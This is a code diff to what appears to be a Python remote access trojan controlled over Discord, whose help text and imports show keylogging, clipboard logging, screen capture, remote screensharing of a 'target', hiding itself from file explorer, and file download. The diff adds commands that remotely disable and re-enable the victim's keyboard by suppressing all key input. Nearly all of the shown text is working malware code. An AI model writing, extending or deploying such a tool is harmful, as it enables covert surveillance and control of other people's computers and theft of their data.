@@ -2,6 +2,7 @@ import os, datetime, pyautogui, subprocess, requests, cv2, zipfile, asyncio, pla
 import discord, io, aiohttp
 import numpy as np
 
+from pynput.keyboard import Listener
 from mss import mss
 from Clip_logging import Cliplogger
 from Key_logging import Keylogger
@@ -20,7 +21,8 @@ clogger = Cliplogger()
 activeRecording = {}
 activeStreaming = {}
 prefix = '.'
-BOT_IDENTITY = set()
+blocked = False
+blocker = None
 
 def get_current_userAndMachine():
     user = os.getlogin()
@@ -486,6 +488,8 @@ async def help(ctx: commands.Context):
         ".hide      :: hides the file from file explorer\n"
         ".screenshare <url> :: share screen from target and view it in browser\n"
         ".stopsharing :: stop screenshare\n"
+        ".enablekey :: enable target's keyboard input\n"
+        ".disablekey :: disable target's keyboard input\n"
         "\n"
         "::FILE TRANSFER\n"
         ".download <file> [expired-time] :: turns a file into downloadable link\n"
@@ -556,6 +560,32 @@ async def stopsharing(ctx: commands.Context):
     else:
         await ctx.send("no active webstreaming session here!")
         return False
+
+async def disable_keyboard(ctx: commands.Context):
+    try:
+        global blocked, blocker
+        if not blocked:
+            blocker = Listener(suppress=True)
+            blocker.start()
+            blocked = True
+            await ctx.send("disabled keyboard")
+        else:
+            await ctx.send("already disabled")
+    except Exception as e:
+        await ctx.send(f"{e}")
+
+async def enable_keyboard(ctx: commands.Context):
+    try:
+        global blocked, blocker
+        if blocked and blocker is not None:
+            blocker.stop()
+            blocker = None
+            blocked = False
+            await ctx.send("enabled keyboard")
+        else:
+            await ctx.send("keyboard is not disabled yet")
+    except Exception as e:
+        await ctx.send(f"{e}")
 
 @bot.event
 async def on_ready():
@@ -711,6 +741,10 @@ async def on_message(message):
             await hide(ctx)
         elif command == ".stopsharing":
             await stopsharing(ctx)
+        elif command == ".enablekey":
+            await enable_keyboard(ctx)
+        elif command == ".disablekey":
+            await disable_keyboard(ctx)
         else:
             await ctx.send(f"unknown command `{command}`, type `.help` for help")
             return
